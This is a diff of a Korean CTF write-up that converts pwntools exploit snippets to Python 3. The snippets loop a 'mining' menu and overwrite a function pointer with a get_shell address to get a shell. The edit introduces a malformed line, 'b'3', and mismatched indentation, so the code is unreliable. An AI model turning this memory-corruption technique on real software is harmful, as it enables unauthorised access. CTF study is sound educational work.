@@ -211,14 +211,14 @@ idx = 0  # 현재 광물의 인덱스 (vector<Mineral*>에 쌓이는 순서)
 ### 반복적으로 mining 시도
 
 ```
-while(1):
+while True:
     print(idx)
-    p.recvuntil('>> ')
-    p.sendline("1")  # mining
+    p.recvuntil(b'>> ')       
+    p.sendline(b"1")        
     p.recvline()
-    sleep(1.1)
+    time.sleep(1.1)
     a = p.recvline()
-    print('output : ' + a)
+    print('output :', a.decode())  
 ```
 * mining() 호출 (1번 메뉴)
 * a는 mining 결과 메시지.
@@ -228,11 +228,12 @@ while(1):
 ### 발견된 광물에 따른 분기 처리
 
 ```python
-if(a == "[+] Congratulations! you found an *undiscovered* mineral!\n"):
-    print('mineral')
-    p.recvuntil("Please enter mineral's description : ")
-    p.sendline("aaaa")  # 그냥 dummy
-    idx+=1
+    if a == b"[+] Congratulations! you found an *undiscovered* mineral!\n" or a == b"[+] You found a rare-earth element!\n":
+        if a == b"[+] Congratulations! you found an *undiscovered* mineral!\n":
+            print('mineral')
+            p.recvuntil(b"Please enter mineral's description : ")
+            p.sendline(b"aaaa")
+            idx += 1
 ```
 
 평범한 광물 발견 시: UndiscoveredMineral → idx 증가
@@ -242,9 +243,9 @@ if(a == "[+] Congratulations! you found an *undiscovered* mineral!\n"):
 else:
     print('rare-earth')
     ...
-    p.sendline('3')  # 메뉴 3: edit_mineral_book
+    p.sendline('b'3')  # 메뉴 3: edit_mineral_book
     ...
-    p.sendline(str(idx))  # 방금 얻은 rare-earth의 인덱스를 넘김
+    p.sendline(str(idx).encode())  # 방금 얻은 rare-earth의 인덱스를 넘김
     ...
     p.send(payload)  # 함수 포인터 자리에 get_shell 주소 덮어쓰기
     p.interactive()  # 쉘 진입
